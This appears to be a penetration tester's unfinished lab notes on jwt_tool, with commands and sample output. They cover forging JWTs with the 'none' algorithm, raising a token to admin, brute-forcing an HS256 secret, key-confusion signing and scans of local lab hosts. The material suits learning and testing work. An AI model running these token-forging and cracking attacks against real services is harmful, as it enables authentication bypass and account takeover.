# JWT_Tool

## Install
See GitHub

## Usage

Many commands return a string similar to 'jwttool<alphanumeric>'
The request used can be returned:
```shell
python3 jwt_tool.py -Q "jwttool_fb724ea7181908c94f5a2607dc785cf"
```


### Read the token
```shell
jwt_tool "<JWT>"
```

### None algorithm test
Create tokens for a vulnerability in the JWT implementation where the server incorrectly allows tokens with the "alg": "none" algorithm to bypass signature validation.  

Creates tokens with the 'none' algorithm
  - 4 tokens with various spellings of 'none'
    - none
    - None
    - NONE
    - nOnE
  - removes signature part of the token

```shell
jwt_tool "<JWT>" -X a 
```

### Tamper with the token
Allows editing the token header and payload
Burp supports this as well

```shell
jwt_tool "<JWT>" -T
```

Edit algorithm to 'none' and change userId to admin and isAdmin to true
Original
eyJpYXQiOjE3MzI0NzMxNzMsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ4MjE3MywidXNlcklkIjoic2VjdXJlc3RvcmUiLCJpc0FkbWluIjoiZmFsc2UifQ

Tampered
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpYXQiOjE3MzI0NzMxNzMsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ4MjE3MywidXNlcklkIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlfQ.

### HS256 Brute force
jwt_tool "<JWT>" -C -d <wordlist>

Token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzI0ODA4NDUsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ4OTg0NSwidXNlcklkIjoiYWRtaW4iLCJpc0FkbWluIjoidHJ1ZSJ9.txbUYuqhvcZdYOo0bBQeExVlaeiuCSd7rB7g1btyaEU

secret : 123456

```shell
jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzI0ODA4NDUsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ4OTg0NSwidXNlcklkIjoiYWRtaW4iLCJpc0FkbWluIjoidHJ1ZSJ9.txbUYuqhvcZdYOo0bBQeExVlaeiuCSd7rB7g1btyaEU -C -d numbers.txt
```

```text
[+] 123456 is the CORRECT key!
```

### Scanning

Can scan for 

Look for text in RED for identified issues

Example
```shell
python3 jwt_tool.py -t <target> -rh "Authorization: Bearer <JWT>" -M at -cv
```
Args:
  - -M : playbook scan
    - at : run all tests
  -cv : canary value, a text value expected in a successful use of the token

```shell
python3 jwt_tool.py -t http://192.168.56.101/v3/ -rh "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3MzI0ODE4NTAsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ5MDg1MCwidXNlcklkIjoic2VjdXJlc3RvcmUiLCJpc0FkbWluIjoiZmFsc2UifQ.hviPDcKdEQm-sfEU2CBmMsyaivneN76f5RUkX_wBCWemsaxeeoiOj7ajCAhQ2ciBE3P2D0IiwyHjgaO2vDpMmSrsL9pEsfiVmf7P7ef88_Ekx6OHEzxw1ExuRknaewZY_I5O5suWime5Wyf9WEaHIBVPs0ewJpmp0vk0MgK1xc1zSN-8mkxocM13tzcsWCw66QTFna57lILw6jLTXmJzZBYd2UwVmbGMBWWg47BG4jGQTMuD-4nhCrt1x4pO1acGwuYsQ0wvs8bGlEjr2ao-2FNIL8qbhxi9IBg3nrJrLZbHPZubd8aTpTCJB0J7y39MEC7aolNya05-EkkDYquvxg" -M at -cv "creditCard"
```


### Signing Keys

#### HS256

Sign with a secret
JWT should just be header and payload values

Example:
```shell
jwt_tool "<JWT>" -S hs256 -p jwt-secret-key
```

Example:
```shell
jwt_tool "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3MzI0ODE4NTAsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ5MDg1MCwidXNlcklkIjoic2VjdXJlc3RvcmUiLCJpc0FkbWluIjoiZmFsc2UifQ." -S hs256 -p "mySecret123"  
```

Returns:
```text
jwttool_1112c3dc36cac9d7ed081603083d3c82 - Tampered token - HMAC Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzI0ODE4NTAsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ5MDg1MCwidXNlcklkIjoic2VjdXJlc3RvcmUiLCJpc0FkbWluIjoiZmFsc2UifQ.dXelEBdBwDXUJehNWiWQsCsRBufltkZZ9sBpv0f5X7g 
```

#### RS256

Requires a private key  
  - JWT should just be header and payload values

Example:
```shell
jwt_tool "<JWT>" -S -pr <private key>
```

Code:
```shell
jwt_tool "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3MzI0ODE4NTAsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ5MDg1MCwidXNlcklkIjoic2VjdXJlc3RvcmUiLCJpc0FkbWluIjoiZmFsc2UifQ." -S rs256 -pr ~/rsa-keys/private.pem  
```

Returns:
``` text
jwttool_eee27528a3f9e43a199c30a7270e936e - Tampered token - RSA Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3MzI0ODE4NTAsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ5MDg1MCwidXNlcklkIjoic2VjdXJlc3RvcmUiLCJpc0FkbWluIjoiZmFsc2UifQ.m_cpU3eFZEhMfD_J29O_6YHLjjxXNPiRNcIBSwoc41wAGC713i1aSLcXbN4DZOg6Qs_Nt_zUAQM2SFU6mIsAsm4tv62BkCecy7SVjpnOy-umQyBTgHvb6b88tdKX4vf5me_RhJqSkJGYIhjn2-zjz1Z_aLGcZhDX7Dt8Npe8OF8CZI9ZOhW8Cuk7YMbPWHZQ2tEE4xQjZkf21RbUyW7hZNSLVWuUYhvHpZ9t31GZ_a4yOM7oFL_rJhhv_zmeKqEMi07ZU0muTMopXeH5aTXlpvsEdUAHZwqN3fWWMfrkMhQG5Uj3hK5CvKOj04sbkZKbsgNjgNo9nlepltl2GBrOzw
```

### Key Confusion

Requires a public key

Example  
```shell
jwt_tool "<JWT>" -X k -pk <public key> 
```

```shell
jwt_tool "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3MzI0ODE4NTAsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ5MDg1MCwidXNlcklkIjoic2VjdXJlc3RvcmUiLCJpc0FkbWluIjoiZmFsc2UifQ.hviPDcKdEQm-sfEU2CBmMsyaivneN76f5RUkX_wBCWemsaxeeoiOj7ajCAhQ2ciBE3P2D0IiwyHjgaO2vDpMmSrsL9pEsfiVmf7P7ef88_Ekx6OHEzxw1ExuRknaewZY_I5O5suWime5Wyf9WEaHIBVPs0ewJpmp0vk0MgK1xc1zSN-8mkxocM13tzcsWCw66QTFna57lILw6jLTXmJzZBYd2UwVmbGMBWWg47BG4jGQTMuD-4nhCrt1x4pO1acGwuYsQ0wvs8bGlEjr2ao-2FNIL8qbhxi9IBg3nrJrLZbHPZubd8aTpTCJB0J7y39MEC7aolNya05-EkkDYquvxg" -X k -pk ~/rsa-keys/public.pem 
```

Returns:
```text
File loaded: /home/bikeride/rsa-keys/public.pem
jwttool_fb724ea7181908c94f5a2607dc785cf2 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)                                                                                                                     
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzI0ODE4NTAsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ5MDg1MCwidXNlcklkIjoic2VjdXJlc3RvcmUiLCJpc0FkbWluIjoiZmFsc2UifQ.Ma27_tZTWfFe1dR3w4713-eOA2xgkrLPpNe5pM9fPwg  
```

### Playbook attacks

Issues
```shell
jwt_tool -t http://localhost:8888//identity/api/v2/user/dashboard -rh "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMUB1c2VyMS5jb20iLCJpYXQiOjE3MzIwNjI2MzIsImV4cCI6MTczMjY2NzQzMiwicm9sZSI6InVzZXIifQ.VunjCXP8DcMDjVBg-8O4y3Dvih5UEHE1Evk9R4fKWQSFAxIEdFNW3W7jj14BIZwZ6FM71yYccVkrJLqj-yYLjO5pJZow2eTPupU4xkGzQ48e1Urv5WCPcfEQJco9x3tzBuhOc5zP3m_deP8P8kejPvdA2XBQNdHiSguuS-tfmj5SBdZk6bHnmIVfkCR3AS-SnSir2hFV_liqdWqAIN_0OvG7p2YtpIxgl9pjrqGNu0_I1POiC1R0LpeWSWbbV2MD_vH8ye5zzJxfstRjy0SZ78_UdH75p605lfIW9pCaeYOlWN6wiHRPPHUGABXLjfWWPKC4fSEytt2YiIbNyRUgsA" -M pb
```

Worked  
set a shell variable
```shell
JWT="<JWT>"

### KID Attacks

TBD
